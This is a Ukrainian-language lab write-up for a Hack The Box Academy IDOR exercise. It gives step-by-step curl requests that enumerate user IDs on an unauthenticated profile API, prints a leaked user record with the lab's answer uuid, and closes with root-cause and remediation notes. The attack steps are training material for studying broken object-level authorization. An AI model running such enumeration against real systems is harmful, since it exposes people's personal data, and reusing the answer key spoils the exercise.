# Web Attacks — IDOR via API Endpoint (profile/api.php)

Модуль: [Web Attacks](https://academy.hackthebox.com/app/module/134)
Секція: [IDOR in Insecure APIs](https://academy.hackthebox.com/app/module/134/section/1201)
Ціль: 154.57.164.70:31879
Відповідь: `eb4fe264c10eb7a528b047aa983a4829`

## Концепція

Тут той самий клас вразливості (IDOR), але вектор інший — не HTML-сторінка з посиланнями, а **прямий REST-подібний API**, що використовується frontend'ом для завантаження даних профілю (типова SPA/AJAX-архітектура: `/profile/api.php/profile/{uid}`). API не перевіряє, чи `uid` в URL відповідає ID поточної авторизованої сесії — будь-хто може підставити довільний `uid` і отримати чужі персональні дані (PII): повне ім'я, email, `uuid`, роль.

Ключовий момент цього кейсу — саме `uuid` є прикладом того, що expose'ити внутрішні ідентифікатори через API без контролю доступу небезпечно навіть тоді, коли вони "виглядають" як безпечні (непослідовні, хешоподібні), бо сам факт витоку `uuid` іншого користувача може дати плацдарм для подальших атак (наприклад, якщо цей `uuid` десь використовується як токен доступу чи параметр reset пароля).

## Крок 1 — Знаходимо точку входу в застосунок (Edit Profile)

```bash
curl -s "http://154.57.164.70:31879/" | grep -i -A3 "profile\|edit"
```

У головній сторінці бачимо форму `<form action="/profile/index.php" method="post">` — це наводить на існування розділу профілю, всередині якого JS швидше за все робить AJAX-запити до якогось `api.php`.

## Крок 2 — Отримуємо сесійну cookie (навіть неавторизовану)

```bash
curl -s -c cookies.txt "http://154.57.164.70:31879/" -o /dev/null
cat cookies.txt
```

Пояснення: `-c cookies.txt` зберігає всі cookie, встановлені сервером у відповіді, у файл у форматі Netscape. Це важливо, бо застосунок може прив'язувати сесію (навіть анонімну/гостьову) до cookie, і без неї API може відповідати інакше (403/redirect). У цьому випадку cookie-файл виявився порожнім — сервер сесію взагалі не видав, що ще раз підкреслює відсутність будь-якого контролю доступу на API.

## Крок 3 — Звертаємось напряму до API з відомим uid (baseline)

```bash
curl -s -b cookies.txt "http://154.57.164.70:31879/profile/api.php/profile/1" | python3 -m json.tool
```

Результат — повний JSON-профіль користувача `uid=1` (Amy Lindon), включно з `uuid`, `email`, `role`. Це підтверджує: ендпоінт віддає дані виключно на основі числа в URL, без перевірки, хто питає.

## Крок 4 — Запитуємо цільовий uid=5

```bash
curl -s -b cookies.txt "http://154.57.164.70:31879/profile/api.php/profile/5" | python3 -m json.tool
```

Результат:
```json
{
    "uid": "5",
    "uuid": "eb4fe264c10eb7a528b047aa983a4829",
    "role": "employee",
    "full_name": "Callahan Woodhams",
    "email": "c_woodhams@employees.htb",
    "about": "I don't like quoting others!"
}
```

Відповідь на завдання — поле `uuid`: `eb4fe264c10eb7a528b047aa983a4829`.

## Чому це працює (root cause для звіту)

- **Опис:** API-ендпоінт `/profile/api.php/profile/{uid}` повертає повні дані профілю будь-якого користувача за числовим `uid` у шляху URL, без перевірки належності запиту авторизованій сесії.
- **Технічні деталі:** REST-подібний роут використовує path-параметр як прямий індекс у БД (`SELECT * FROM users WHERE uid = ?`) без додаткової перевірки `session.uid == requested_uid`; сервер навіть не встановлює сесійну cookie, тобто авторизації як такої немає взагалі.
- **Ризик/Імпакт:** IDOR / Broken Object Level Authorization (OWASP API Security Top 10 — API1:2023) — витік PII усіх співробітників (ім'я, email, внутрішній `uuid`) шляхом простого перебору послідовних `uid` в API, без потреби в обході будь-яких фільтрів чи кодування.
- **Рекомендації:** Впровадити перевірку авторизації на рівні об'єкта (BOLA) — сервер має перевіряти, що `uid` з URL збігається з ID користувача з дійсної сесії/JWT, перш ніж повертати дані; логувати й обмежувати частоту запитів до API для виявлення enumeration-атак.
